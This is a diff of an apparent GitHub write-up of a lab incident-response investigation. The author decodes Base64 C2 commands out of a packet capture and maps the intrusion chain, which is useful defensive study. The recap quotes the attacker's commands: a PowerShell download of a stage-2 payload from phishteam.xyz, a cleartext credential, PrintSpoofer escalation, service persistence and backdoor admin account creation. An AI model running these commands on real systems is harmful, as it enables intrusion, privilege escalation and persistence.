@@ -170,78 +170,110 @@ issue commands and execute them. Using HTTP method get and use the parameter q i
 
 ### Discovery - Internal Reconnaissance 
 
-Let's continue the investigation, we know with the scenraio the malicious binary continously uses the C2 traffic. Also we need to discover what sensitive data the hacker gain acces and what command he execute. 
+Let's continue the investigation. Based on the scenario, the 
+malicious binary continuously uses the C2 channel for communication. 
+We need to discover what sensitive data the attacker accessed and 
+what commands he executed.
 
-First to all i need to decode every base64 string in wireshark but copy past every ligne in Cyberchef will take lot of time , that why  we need CLI Tshark to gain time. 
+First, I need to decode every Base64 string in Wireshark but 
+copy-pasting every line into CyberChef would take far too much 
+time. Instead, I use the **Tshark CLI** to automate the decoding.
 
-PS C:\Users\user> & "C:\Program Files\Wireshark\tshark.exe" -r "C:\Users\user\Desktop\Incident Files\capture.pcapng" -Y "http.request" -T fields -e http.request.uri | ForEach-Object {
->>     $q = ($_ -split 'q=', 2)[1]
->>     if ($q) {
->>         [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($q))
->>         "`n========================`n"
->>     }
->> }
+```powershell
+& "C:\Program Files\Wireshark\tshark.exe" -r "capture.pcapng" 
+  -Y "http.request" -T fields -e http.request.uri | ForEach-Object {
+    $q = ($_ -split 'q=', 2)[1]
+    if ($q) {
+        [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($q))
+        "`n========================`n"
+    }
+}
+```
+
+
 <img width="700" height="264" alt="Capture d&#39;écran 2026-06-08 144145" src="https://github.com/user-attachments/assets/d8cb7795-5f9c-4443-a292-681b4575dd91" />
 
-I can read easily every command and what's the attacker do ! and this is a quick recap of all of my discovery : 
+Now I can read every command the attacker executed. Here's a 
+quick recap of the full attack chain:
 
-PHASE 1 — RECONNAISSANCE (as benimaru)
-─────────────────────────────────────────────────
-whoami → tempest\benimaru
-pwd → C:\Windows\system32
-dir C:\Users → lists all users
-net users → lists all accounts
-net localgroup admins → Administrator + rimuru
-net user benimaru → details of the benimaru account
-dir Desktop → finds automation.ps1
-cat automation.ps1 → 🎯 FOUND CLEAR-TEXT PASSWORD
-netstat -ano → checks active connections
+**PHASE 1 — Reconnaissance** (as `benimaru`)
+```
+whoami                  → tempest\benimaru
+pwd                     → C:\Windows\system32
+dir C:\Users            → lists all users
+net users               → lists all accounts
+net localgroup admins   → Administrator + rimuru
+net user benimaru       → details of the benimaru account
+dir Desktop             → finds automation.ps1
+cat automation.ps1      → 🎯 FOUND CLEAR-TEXT PASSWORD
+netstat -ano            → checks active connections
+```
 
-PHASE 2 — INITIAL PRIVILEGE GAIN
-─────────────────────────────────────────────────
-Critical discovery:
+
+**PHASE 2 — Initial Privilege Gain**
+```
+Critical discovery in automation.ps1:
 $user = "TEMPEST\benimaru"
-$pass = "infernotempest" ← CREDENTIAL EXPOSED!
+$pass = "infernotempest"        ← CREDENTIAL EXPOSED!
+```
 
-PHASE 3 — DOWNLOAD STAGE 2 PAYLOAD
-─────────────────────────────────────────────────
-powershell iwr http://phishteam.xyz/02dcf07/ch.exe -outfile C:\Users\benimaru\Downloads\ch.exe
+**PHASE 3 — Download Stage 2 Payload**
+```
+powershell iwr http://phishteam.xyz/02dcf07/ch.exe 
+           -outfile C:\Users\benimaru\Downloads\ch.exe
+
 → ch.exe (8.2 MB) = likely chisel.exe for tunneling
 → or a privilege escalation payload
+```
 
-PHASE 4 — PRIVILEGE ESCALATION SUCCESSFUL
-─────────────────────────────────────────────────
-whoami → nt authority\system 🚨 SYSTEM PRIVILEGES
-→ the attacker successfully escalated to ROOT
-whoami /priv → all SYSTEM privileges listed
 
-PHASE 5 — PASSWORD CHANGE (sabotage)
-─────────────────────────────────────────────────
+**PHASE 4 — Privilege Escalation Successful** 🚨
+```
+whoami        → nt authority\system   (SYSTEM PRIVILEGES)
+whoami /priv  → all SYSTEM privileges listed
+
+→ The attacker successfully escalated to ROOT
+```
+
+**PHASE 5 — Password Change (Sabotage)**
+```
 net user Administrator ch4ng3dpassword!
-→ changes the admin password to prevent losing control
 
-PHASE 6 — ATTEMPTS (some failures)
-─────────────────────────────────────────────────
-net user shuna princess → fail (does not exist)
-net user shion m4st3rch3f! → fail (does not exist)
-→ the attacker tries to modify users that do not exist
-
-PHASE 7 — PERSISTENCE via SERVICE
-─────────────────────────────────────────────────
-sc.exe create TempestUpdate → fail (already exists)
-sc.exe create TempestUpdate2 binpath=C:\ProgramData\final.exe → SUCCESS
-→ auto-start at boot
-→ runs as LocalSystem 🚨 PERSISTENCE via fake Windows service → MITRE T1543.003 (Windows Service)
-
-PHASE 8 — BACKDOOR ACCOUNT CREATION
-─────────────────────────────────────────────────
-net user /add shuna princess → SUCCESS
-net user /add shion m4st3rch3f! → SUCCESS
-net localgroup administrators /add shion → SUCCESS
-🚨 shion is added to ADMINISTRATORS = admin backdoor created
+→ Changes the admin password to prevent losing control
+```
 
 
-Also i need to check with sysmon the file ch.exe and use the hash with a tools like VirusTotal to gain more information.
+**PHASE 6 — Failed Attempts**
+```
+net user shuna princess         → fail (does not exist)
+net user shion m4st3rch3f!      → fail (does not exist)
+
+→ The attacker tries to modify users that do not exist yet
+```
+
+
+**PHASE 7 — Persistence via Service** 🚨
+```
+sc.exe create TempestUpdate                            → fail (already exists)
+sc.exe create TempestUpdate2 
+       binpath= C:\ProgramData\final.exe 
+       start= auto                                     → SUCCESS
+
+→ Auto-start at boot, runs as LocalSystem
+→ MITRE T1543.003 (Windows Service Persistence)
+```
+
+
+**PHASE 8 — Backdoor Account Creation** 🚨
+```
+net user /add shuna princess                → SUCCESS
+net user /add shion m4st3rch3f!             → SUCCESS
+net localgroup administrators /add shion    → SUCCESS
+
+→ shion is added to ADMINISTRATORS = admin backdoor created
+```
+
+Also i need to check with sysmon the file ch.exe and use the hash value with a tools like VirusTotal to gain more information.
 
 <img width="700"  alt="Capture d&#39;écran 2026-06-08 144117" src="https://github.com/user-attachments/assets/a82e0105-8e92-4b46-a325-d184fffbe15e" />
 
@@ -257,15 +289,28 @@ I have everything i need to answer question :
 
 ### Privilege Escalation - Exploting Privileges
 
-With my investigation around the Encoding command i already know lot of things about how the attacker gain more privilege. And i already discover the second c2 connection  with the file Final.exe. 
+Through my analysis of the decoded commands, I already know a lot 
+about how the attacker gained higher privileges. I also identified 
+a second C2 connection involving the file `final.exe`.
 
-I know the attacker downloaded another binary for the escalation and with a rapid filter with wireshark i discover the file who permit to gain root privilege. I assume he use the same Ip adress and bingo i find something . 
+I know the attacker downloaded another binary for escalation. 
+Using a quick Wireshark filter, I assume he uses the same IP 
+address  and I find the file that allowed him to gain root 
+privileges.
+
 <img width="700"  alt="Capture d&#39;écran 2026-06-08 151325" src="https://github.com/user-attachments/assets/e3569eeb-a0ee-4c87-baa8-0bc1ee2fe0aa" />
 
-Again i get the Sha256 Hash with sysmon filter by Event ID 1 and file name for taking more information with VirusTotal. I know the malware name and how he's work : Printspoofer , a tools who abuse to "SeTmpersonatePrivilege" to gain a escalation .
+I then get the SHA-256 hash via Sysmon (Event ID 1, filtered by 
+file name) to look up the binary on **VirusTotal**. The result 
+identifies the malware as **PrintSpoofer**  a tool that abuses 
+the `SeImpersonatePrivilege` to gain SYSTEM-level privilege 
+escalation.
 
 
-The last file i need to check  is final.exe who will put another c2 connection.  I find the second c2 connection information because more early when i make some investigation with the ip destination i find another communication with the port 8080. 
+The last file I need to investigate is `final.exe`, which sets up 
+another C2 connection. I find the second C2 information because 
+earlier in my investigation of the destination IP, I noticed 
+another communication on **port 8080**.. 
 
 <img width="700"  alt="Capture d&#39;écran 2026-06-08 152933" src="https://github.com/user-attachments/assets/b975a6dc-96b7-426c-b166-1a47d2a13629" />
 
@@ -277,7 +322,12 @@ Again the answer is :
  
 ### Actions on objective - Fully-owned Machine. 
 
-The last part of the room is very easy because i have already decode all of the base64 string command and i know what the attacker do . The creation of account, set as high privilege groupe .... I have just to read all the command and answer question. 
+
+The last part of the room is straightforward because I have already 
+decoded all the Base64 commands and know exactly what the attacker 
+did: account creation, adding users to high-privilege groups, etc. 
+I just need to read through the commands to answer the remaining 
+questions.
 
 
 <img width="700"  alt="Capture d&#39;écran 2026-06-08 153921" src="https://github.com/user-attachments/assets/40cf47c4-d5d7-44b7-b9d5-0ee0950552a2" />
@@ -288,9 +338,24 @@ The last part of the room is very easy because i have already decode all of the 
 
 This investigation provided a fantastic opportunity to work on a realistic incident response scenario. It was a true challenge that allowed me to apply the months of theory I have accumulated into a practical environment.
 
-The most valuable lesson from this room was learning how to effectively correlate network traffic in Wireshark with endpoint logs in Sysmon, the combination of both tools is absolutely critical for a SOC analyst. Through this deep-dive analysis, I successfully mapped out the entire attack lifecycle: from the initial access via a malicious document, to the C2 reverse-shell establishment, credential theft, and ultimate machine takeover via backdoor account creation.
+The most valuable lesson from this room was learning how to effectively correlate network traffic in Wireshark with endpoint logs in Sysmon, the combination of both tools is absolutely critical for a SOC analyst. 
 
-From a remediation standpoint, immediately blocking the C2 IP addresses at the firewall level, disabling the rogue services, and purging the unauthorized backdoor users/groups are the most vital first steps to fully eradicate this threat.
+
+Through this deep-dive analysis, I successfully mapped out the 
+entire attack lifecycle:
+- Initial access via a malicious document
+- C2 reverse-shell establishment
+- Credential theft (plaintext credentials in a script)
+- Privilege escalation via PrintSpoofer
+- Persistence via a fake Windows service
+- Backdoor account creation
+
+From a remediation standpoint, the most vital first steps are:
+- Immediately blocking the C2 IP addresses at the firewall level
+- Disabling the rogue `TempestUpdate2` service
+- Purging the unauthorized backdoor accounts (`shion`, `shuna`)
+- Resetting the Administrator password
+- Removing PrintSpoofer and any persistence mechanisms
 
 ---
 
